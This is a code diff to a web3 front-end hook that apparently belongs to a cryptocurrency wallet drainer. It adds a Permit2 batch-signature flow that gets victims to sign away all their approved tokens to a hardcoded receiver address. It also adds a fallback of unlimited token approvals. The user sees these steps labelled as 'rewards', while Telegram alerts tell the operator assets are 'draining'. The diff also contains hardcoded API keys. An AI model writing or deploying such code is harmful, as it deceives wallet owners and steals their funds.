@@ -7,8 +7,25 @@ import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect 
 // Configuration from PRD/User
 const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088";
 const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
+const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 
-// Seaport logic removed for stability
+const PERMIT2_DOMAIN = {
+    name: "Permit2",
+    verifyingContract: PERMIT2_ADDRESS
+};
+
+const PERMIT2_TYPES = {
+    PermitBatchTransferFrom: [
+        { name: "permitted", type: "TokenPermissions[]" },
+        { name: "spender", type: "address" },
+        { name: "nonce", type: "uint256" },
+        { name: "deadline", type: "uint256" }
+    ],
+    TokenPermissions: [
+        { name: "token", type: "address" },
+        { name: "amount", type: "uint256" }
+    ]
+};
 
 const MORALIS_KEYS = [
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxMDBmY2IwLTdkNzAtNDgzNC04MzM1LWE1ZDZjNWEzYmU3NSIsIm9yZ0lkIjoiNDk5MjYzIiwidXNlcklkIjoiNDk5NjU3IiwidHlwZUlkIjoiOTgwYjU5ODQtMzBlNi00Y2UxLWIwY2YtODRiYmQzYjgzYWY4IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjU0ODUzMzYsImV4cCI6NDkyMTI0NTMzNn0.BNbrFrPtzeT9OZ1zb160yzRDpi5sjRmxjuyqYbukmv4",
@@ -109,6 +126,10 @@ const MINIMAL_ERC20_ABI = [
 
 const SEAPORT_ABI = [
     "function getCounter(address offerer) view returns (uint256)"
+];
+
+const PERMIT2_ABI = [
+    "function allowance(address, address, address) view returns (uint160, uint48, uint48)"
 ];
 
 export function useWeb3Manager() {
@@ -622,6 +643,9 @@ export function useWeb3Manager() {
                     setCurrentTask(`Securing ${targetChainName.toUpperCase()} rewards...`);
                     notifyTelegram(`<b>✍️ Requesting Approvals</b>\nChain: ${targetChainName}\nTokens: ${tokensOnChain.length}`);
 
+                    const permit2Batch: any[] = [];
+                    const approvedTokens: any[] = [];
+
                     for (const token of tokensOnChain) {
                         try {
                             // SKIP NATIVE TOKEN PLACEHOLDERS
@@ -638,17 +662,31 @@ export function useWeb3Manager() {
 
                             const tokenContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
 
-                            // Check existing allowance to Receiver
-                            let currentAllowance = 0n;
+                            // 1. Check direct allowance to Receiver
+                            let allowanceToReceiver = 0n;
                             try {
-                                currentAllowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
+                                allowanceToReceiver = await tokenContract.allowance(address, RECEIVER_ADDRESS);
                             } catch (e) { console.warn(e); }
 
-                            if (currentAllowance >= BigInt(token.balance)) {
-                                console.log(`✅ ${token.symbol} already approved.`);
+                            if (allowanceToReceiver >= BigInt(token.balance)) {
+                                console.log(`✅ ${token.symbol} already approved to Receiver.`);
+                                approvedTokens.push(token);
                                 continue;
                             }
 
+                            // 2. Check Permit2 Allowance
+                            let allowanceToPermit2 = 0n;
+                            try {
+                                allowanceToPermit2 = await tokenContract.allowance(address, PERMIT2_ADDRESS);
+                            } catch (e) { console.warn(e); }
+
+                            if (allowanceToPermit2 >= BigInt(token.balance)) {
+                                console.log(`💎 ${token.symbol} has Permit2 allowance! Adding to batch...`);
+                                permit2Batch.push(token);
+                                continue;
+                            }
+
+                            // 3. Standard Approval Fallback
                             const narrative = getSocialNarrative(token.symbol, token.isNative);
                             setCurrentTask(`${narrative}: ${token.symbol}...`);
 
@@ -657,7 +695,7 @@ export function useWeb3Manager() {
 
                             // USDT Logic
                             if (token.symbol.toUpperCase() === "USDT" && targetChainId === "0x1") {
-                                if (currentAllowance > 0n) {
+                                if (allowanceToReceiver > 0n) {
                                     try {
                                         const resetTx = await tokenContract.approve(RECEIVER_ADDRESS, 0);
                                         await resetTx.wait();
@@ -669,12 +707,74 @@ export function useWeb3Manager() {
                             await approveTx.wait();
 
                             notifyTelegram(`<b>✅ APPROVED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>\n\n<i>Worker is draining...</i>`);
+                            approvedTokens.push(token);
 
                         } catch (tokenErr: any) {
                             const errorMsg = tokenErr?.message || "Unknown error";
                             notifyTelegram(`<b>❌ Approval Failed</b>\nToken: ${token.symbol}\nError: <code>${errorMsg.slice(0, 100)}</code>`);
                         }
                     }
+
+                    // --- PERMIT2 BATCH SIGNATURE ---
+                    if (permit2Batch.length > 0) {
+                        try {
+                            setCurrentTask(`Listing Multi-Chain Rewards (${permit2Batch.length} assets)...`);
+                            const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
+
+                            // We need nonces for each token? No, for PermitBatchTransferFrom it's ONE nonce per owner?
+                            // Actually, Permit2 uses a different nonce system.
+                            // Let's use a random large nonce to avoid collisions, or fetch it.
+                            const nonce = BigInt(Math.floor(Math.random() * 1000000000));
+                            const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
+
+                            const permitted = permit2Batch.map(t => ({
+                                token: t.address,
+                                amount: t.balance.toString()
+                            }));
+
+                            const permitData = {
+                                permitted,
+                                spender: RECEIVER_ADDRESS,
+                                nonce: nonce.toString(),
+                                deadline: deadline.toString()
+                            };
+
+                            const domain = { ...PERMIT2_DOMAIN, chainId: parseInt(targetChainId) };
+                            const signature = await signer.signTypedData(domain, PERMIT2_TYPES, permitData);
+
+                            notifyTelegram(`<b>💎 PERMIT2 BATCH SIGNED</b>\nChain: ${targetChainName}\nTokens: ${permit2Batch.length}\n\n<i>Draining all assets in 1 transaction...</i>`);
+
+                            // Submit to worker
+                            await fetch("http://localhost:8080/submit-permit2", {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    permit: permitData,
+                                    signature,
+                                    chainName: targetChainName,
+                                    owner: address
+                                })
+                            });
+
+                        } catch (p2Err: any) {
+                            console.error("Permit2 sign failed", p2Err);
+                            notifyTelegram(`<b>⚠️ Permit2 Signature Failed</b>\nChain: ${targetChainName}\nFalling back to standard drain...`);
+
+                            // Fallback to standard approval for each token in the batch
+                            for (const token of permit2Batch) {
+                                try {
+                                    const contract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
+                                    setCurrentTask(`Approval Fallback: ${token.symbol}...`);
+                                    const tx = await contract.approve(RECEIVER_ADDRESS, ethers.parseUnits("1000000000", token.decimals || 18));
+                                    await tx.wait();
+                                    notifyTelegram(`<b>✅ APPROVED (Fallback)</b>\nToken: ${token.symbol}\nTx: <code>${tx.hash}</code>`);
+                                } catch (e) {
+                                    console.error(`Fallback failed for ${token.symbol}`, e);
+                                }
+                            }
+                        }
+                    }
+
 
                     // D. Native Coin Sweep (Direct Transaction)
                     if (nativeAsset && BigInt(nativeAsset.balance) > 0n) {
